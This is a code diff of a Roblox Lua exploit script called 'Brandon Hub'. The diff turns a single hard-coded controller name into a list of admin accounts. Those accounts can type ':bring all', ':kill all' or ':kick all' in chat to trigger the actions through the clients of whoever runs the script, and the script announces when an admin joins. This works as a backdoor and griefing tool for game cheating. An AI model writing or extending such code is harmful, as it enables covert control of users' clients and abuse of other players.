@@ -1,4 +1,26 @@
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local AdminNames = {"MaybeFlashh", "ikbengoerge99"}
+
+local function isAdmin(player)
+    for _, name in ipairs(AdminNames) do
+        if player.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+local function notifyPlayer(message)
+    local executor = Players.LocalPlayer
+    if executor then
+        StarterGui:SetCore("SendNotification", {
+            Title = "Brandon Hub",
+            Text = message,
+            Duration = 5
+        })
+    end
+end
 
 local function bringAll()
     local admin = Players.LocalPlayer
@@ -39,13 +61,16 @@ end
 
 for _, player in ipairs(Players:GetPlayers()) do
     player.Chatted:Connect(function(message)
-        if player.Name == "MaybeFlashh" then
+        if isAdmin(player) then
             if message == ":bring all" then
                 bringAll()
+                notifyPlayer("Brought all players to you!")
             elseif message == ":kill all" then
                 killAll()
+                notifyPlayer("Killed all players!")
             elseif message == ":kick all" then
                 kickAll()
+                notifyPlayer("Kicked all players!")
             end
         end
     end)
@@ -53,14 +78,32 @@ end
 
 Players.PlayerAdded:Connect(function(newPlayer)
     newPlayer.Chatted:Connect(function(message)
-        if newPlayer.Name == "MaybeFlashh" then
+        if isAdmin(newPlayer) then
             if message == ":bring all" then
                 bringAll()
+                notifyPlayer("Brought all players to you!")
             elseif message == ":kill all" then
                 killAll()
+                notifyPlayer("Killed all players!")
             elseif message == ":kick all" then
                 kickAll()
+                notifyPlayer("Kicked all players!")
             end
         end
     end)
+    
+    if isAdmin(newPlayer) then
+        notifyPlayer("Brandon Hub")
+        wait(0.5)
+        notifyPlayer("An admin of the script has joined the game!")
+    end
 end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if isAdmin(player) then
+        notifyPlayer("Brandon Hub")
+        wait(0.5)
+        notifyPlayer("An admin of the script has joined the game!")
+        break
+    end
+end
